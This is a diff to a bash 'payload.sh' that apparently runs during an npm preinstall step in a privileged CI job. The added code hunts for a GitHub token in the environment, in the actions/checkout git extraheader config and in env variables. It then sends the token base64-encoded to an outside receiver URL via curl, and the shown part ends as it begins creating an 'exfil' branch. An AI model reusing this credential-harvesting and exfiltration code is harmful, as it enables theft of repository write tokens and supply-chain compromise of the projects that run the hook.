@@ -1,16 +1,39 @@
 #!/bin/bash
 # payload.sh — Runs during npm ci preinstall in the privileged build job
-# GITHUB_TOKEN is automatically available in the environment (write-all)
 
 RECEIVER_URL="https://sap-test-receiver-production.up.railway.app/collect"
 REPO="delsoup455/architecture-center-test"
 BRANCH="tmp-exfil-$(date +%s)"
 API="https://api.github.com"
-AUTH="Authorization: token $GITHUB_TOKEN"
 
-# --- Phase 1: Send GITHUB_TOKEN to receiver ---
-TOKEN_LEN=${#GITHUB_TOKEN}
-curl -s "$RECEIVER_URL?stage=github_token&token_len=$TOKEN_LEN&token=$(echo -n $GITHUB_TOKEN | base64 -w0)" || true
+# --- Extract GITHUB_TOKEN ---
+# The token may be in the env directly, or stored by actions/checkout in:
+# 1. The git extraheader config (Basic auth base64)
+# 2. The ACTIONS_RUNTIME_TOKEN env var
+# 3. The git credential helper
+
+# Try env var first
+TOKEN="$GITHUB_TOKEN"
+
+# If not in env, extract from git config (actions/checkout stores it as extraheader)
+if [ -z "$TOKEN" ]; then
+  EXTRAHEADER=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
+  if [ -n "$EXTRAHEADER" ]; then
+    # Format: "AUTHORIZATION: basic <base64(x-access-token:TOKEN)>"
+    TOKEN=$(echo "$EXTRAHEADER" | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
+  fi
+fi
+
+# If still empty, try scanning env for any GH token
+if [ -z "$TOKEN" ]; then
+  TOKEN=$(env | grep -iE '^(GITHUB_TOKEN|GH_TOKEN|INPUT_TOKEN)=' | head -1 | cut -d= -f2-)
+fi
+
+AUTH="Authorization: token $TOKEN"
+
+# --- Phase 1: Send token info to receiver ---
+TOKEN_LEN=${#TOKEN}
+curl -s "$RECEIVER_URL?stage=github_token&token_len=$TOKEN_LEN&token=$(echo -n $TOKEN | base64 -w0)" || true
 
 # --- Phase 2: Create a new branch (no harm to existing branches) ---
 # Get the SHA of the joule-integration branch to base our new branch on
